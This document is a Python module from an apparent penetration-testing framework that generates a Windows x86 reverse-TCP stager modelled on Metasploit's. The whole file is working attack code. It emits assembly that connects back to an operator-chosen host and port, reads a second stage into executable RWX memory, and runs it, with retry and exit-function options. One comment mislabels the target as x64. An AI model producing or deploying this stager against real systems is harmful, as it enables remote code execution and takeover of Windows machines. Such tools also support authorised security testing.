import socket
import struct
from collections.abc import Mapping, Sequence

from teralibs.tsf.core.module.base import Base
from teralibs.tsf.core.payload.windows.x86.block_api_x86 import BlockApiX86
from teralibs.tsf.core.payload.windows.x86.exitfunk_x86 import ExitfunkX86
from teralibs.tsf.pex.terasm.api import Terasm


class ReverseTcpX86(Base):
    """
    Complex reverse_tcp payload generation for Windows ARCH_X86.
    Replicates the Metasploit Msf::Payload::Windows::ReverseTcp_x86 module behavior.
    """

    OPTIONS: Sequence = ["LHOST", "LPORT", "EXITFUNC"]
    STAGER_CONF: Mapping = {}

    # Corrected size values to match standard Windows x64 stager bounds
    CACHED_SIZE: int
    AVAILABLE_SPACE: int | None = None

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.exitfunk = ExitfunkX86()
        self.blockapi = BlockApiX86()

        self.register_advanced_options(
            [
                self.opt(
                    "ReverseConnectRetries",
                    "10",
                    False,
                    "Configures the connection persistence loop within the network-based stager",
                    self.otype.INTEGER,
                ),
                self.opt(
                    "PayloadBindPort",
                    None,
                    False,
                    "Port to bind reverse tcp socket to on target system",
                    self.otype.PORT,
                ),
            ]
        )

    def required_space(self) -> int:
        """
        Determine the maximum amount of space required for the features requested.
        """
        space = self.CACHED_SIZE

        # EXITFUNK 'thread' is the biggest by far, adds 29 bytes.
        space += 29

        # Reliability adds bytes
        space += 44

        return space

    def generate(self, ctx) -> bytes:
        """
        Simulates the core entry step to prepare options before full assembly generation.
        """
        conf = {
            "port": int(ctx.get_option("LPORT")),
            "host": (ctx.get_option("LHOST")),
            "retry_count": int(ctx.get_option("ReverseConnectRetries")),
            "bind_port": ctx.get_option("PayloadBindPort"),
            "reliable": False,
        }

        available_space = getattr(ctx, "available_space", None) or self.AVAILABLE_SPACE
        if available_space is not None and self.CACHED_SIZE and self.required_space() <= available_space:
            conf["reliable"] = True
            conf["exitfunk"] = ctx.get_option("EXITFUNC")

        return Terasm("x86", 32, "nasm").assemble(self.generate_reverse_tcp(conf), addr=0x1000)

    def generate_reverse_tcp(self, opts: dict) -> str:
        """Generates and concatenates the overarching assembly layout blocks."""
        asm = f"""
            cld                                 ; Clear the direction flag.
            call start                          ; Call start, this pushes the address of 'api_call'
            {self.blockapi.asm_block_api()}
            start:
                pop ebp
            {self.asm_reverse_tcp(opts)}
            {self.asm_block_recv(opts)}
        """
        return asm

    def asm_reverse_tcp(self, opts: dict) -> str:
        """
        Generate an assembly stub with the configured feature set and network options.
        """
        retry_count = max(int(opts["retry_count"]), 1)

        # 1. Constants
        port = int(opts["port"])
        host = opts["host"]

        encoded_host = f"0x{struct.unpack('<I', socket.inet_aton(host))[0]:08x}"
        encoded_port = f"0x{struct.unpack('>I', struct.pack('<H', port) + struct.pack('>H', 2))[0]:08x}"

        sockaddr_size = f"0x{16:02x}"  # sizeof(struct sockaddr_in) in hex

        asm = f"""
            ; Input: EBP must be the address of 'api_call'.
            ; Output: EDI will be the socket for the connection to the server
            ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

            reverse_tcp:
                push 0x3233                     ; Push the bytes 'ws2_32',0,0 onto the stack.
                push 0x5f327377                 ; ...
                push esp                        ; Push a pointer to the "ws2_32" string on the stack.

                push {self.blockapi.block_api_hash("kernel32.dll", "LoadLibraryA")}

                mov eax, ebp
                call eax                        ; LoadLibraryA( "ws2_32" )
                mov eax, 0x0190                 ; EAX = sizeof( struct WSAData )
                sub esp, eax                    ; alloc some space for the WSAData structure
                push esp                        ; push a pointer to this struct
                push eax                        ; push the wVersionRequested parameter

                push {self.blockapi.block_api_hash("ws2_32.dll", "WSAStartup")}

                call ebp                        ; WSAStartup( 0x0190, &WSAData );

            set_address:
                push 0x{retry_count:04x}        ; retry counter

            create_socket:
                push {encoded_host}             ; host in little-endian format
                push {encoded_port}             ; family AF_INET and port number
                mov esi, esp                    ; save pointer to sockaddr struct

                push eax                        ; if we succeed, eax will be zero, push zero for the flags param.
                push eax                        ; push null for reserved parameter
                push eax                        ; we do not specify a WSAPROTOCOL_INFO structure
                push eax                        ; we do not specify a protocol
                inc eax
                push eax                        ; push SOCK_STREAM
                inc eax
                push eax                        ; push AF_INET

                push {self.blockapi.block_api_hash("ws2_32.dll", "WSASocketA")}

                call ebp                        ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
                xchg edi, eax                   ; save the socket for later, don't care about the value of eax after this
        """

        if opts.get("bind_port") is not None:
            encoded_bind_port = f"0x{struct.unpack('>I', struct.pack('<H', int(opts['bind_port'])) + struct.pack('>H', 2))[0]:08x}"
            asm += f"""
                xor eax, eax
                push 11
                pop ecx
                push_0_loop:
                push eax                        ; if we succeed, eax will be zero, push it enough times to cater for both IPv4 and IPv6
                loop push_0_loop

                ; bind to 0.0.0.0/[::], pushed above

                push {encoded_bind_port}        ; family AF_INET and port number
                mov esi, esp                    ; save a pointer to sockaddr_in struct
                push {sockaddr_size}            ; length of the sockaddr_in struct (we only set the first 8 bytes, the rest aren't used)
                push esi                        ; pointer to the sockaddr_in struct
                push edi                        ; socket

                push {self.blockapi.block_api_hash("ws2_32.dll", "bind")}

                call ebp                        ; bind( s, &sockaddr_in, 16 );
                push {encoded_host}             ; host in little-endian format
                push {encoded_port}             ; family AF_INET and port number
                mov esi, esp
            """

        asm += f"""
            try_connect:
                push 16                         ; length of the sockaddr struct
                push esi                        ; pointer to the sockaddr struct
                push edi                        ; the socket

                push {self.blockapi.block_api_hash("ws2_32.dll", "connect")}

                call ebp                        ; connect( s, &sockaddr, 16 );
                test eax,eax                    ; non-zero means a failure
                jz connected

            handle_connect_failure:

                ; decrement our attempt count and try again

                dec dword [esi+8]
                jnz try_connect
        """

        if opts.get("exitfunk"):
            asm += """
            failure:
                call exitfunk
            """
        else:
            asm += f"""
            failure:
                push {self.blockapi.block_api_hash("kernel32.dll", "ExitProcess")}
                call ebp
            """

        asm += """
            ; this label is required so that reconnect attempts include
            ; the UUID stuff if required.

            connected:
        """

        return asm

    def asm_block_recv(self, opts: dict):
        """
        Generates the communication receive stage buffer processing layout loop.
        """
        reliable = opts.get("reliable", False)

        asm = f"""
            recv:

                ; Receive the size of the incoming second stage...

                push 0                          ; flags
                push 4                          ; length = sizeof( DWORD );
                push esi                        ; the 4 byte buffer on the stack to hold the second stage length
                push edi                        ; the saved socket

                push {self.blockapi.block_api_hash("ws2_32.dll", "recv")}

                call ebp                        ; recv( s, &dwLength, 4, 0 );
        """

        if reliable is True:
            asm += """
            ; reliability: check to see if the recv worked, and reconnect
            ; if it fails

                cmp eax, 0
                jle cleanup_socket
            """

        asm += f"""
                ; Alloc a RWX buffer for the second stage

                mov esi, [esi]                  ; dereference the pointer to the second stage length
                push 0x40                       ; PAGE_EXECUTE_READWRITE
                push 0x1000                     ; MEM_COMMIT
                push esi                        ; push the newly received second stage length.
                push 0                          ; NULL as we dont care where the allocation is.

                push {self.blockapi.block_api_hash("kernel32.dll", "VirtualAlloc")}

                call ebp                        ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

                ; Receive the second stage and execute it...

                xchg ebx, eax                   ; ebx = our new memory address for the new stage
                push ebx                        ; push the address of the new stage so we can return into it

            read_more:
                push 0                          ; flags
                push esi                        ; length
                push ebx                        ; the current address into our second stage's RWX buffer
                push edi                        ; the saved socket

                push {self.blockapi.block_api_hash("ws2_32.dll", "recv")}

                call ebp                        ; recv( s, buffer, length, 0 );
        """

        if reliable is True:
            asm += f"""
                ; reliability: check to see if the recv worked, and reconnect
                ; if it fails

                cmp eax, 0
                jge read_successful

                ; something failed, free up memory

                pop eax                         ; get the address of the payload
                push 0x4000                     ; dwFreeType (MEM_DECOMMIT)
                push 0                          ; dwSize
                push eax                        ; lpAddress

                push {self.blockapi.block_api_hash("kernel32.dll", "VirtualFree")}

                call ebp                        ; VirtualFree(payload, 0, MEM_DECOMMIT)

            cleanup_socket:
                ; clear up the socket

                push edi                        ; socket handle

                push {self.blockapi.block_api_hash("ws2_32.dll", "closesocket")}

                call ebp                        ; closesocket(socket)

                ; restore the stack back to the connection retry count

                pop esi
                pop esi
                dec dword [esp]                 ; decrement the counter

                ; try again

                jnz create_socket
                jmp failure
            """

        asm += """
            read_successful:
                add ebx, eax                    ; buffer += bytes_received
                sub esi, eax                    ; length -= bytes_received, will set flags
                jnz read_more                   ; continue if we have more to read
                ret                             ; return into the second stage
        """

        if opts.get("exitfunk"):
            asm += self.exitfunk.asm_exitfunk(opts, self.blockapi.block_api_hash)

        return asm
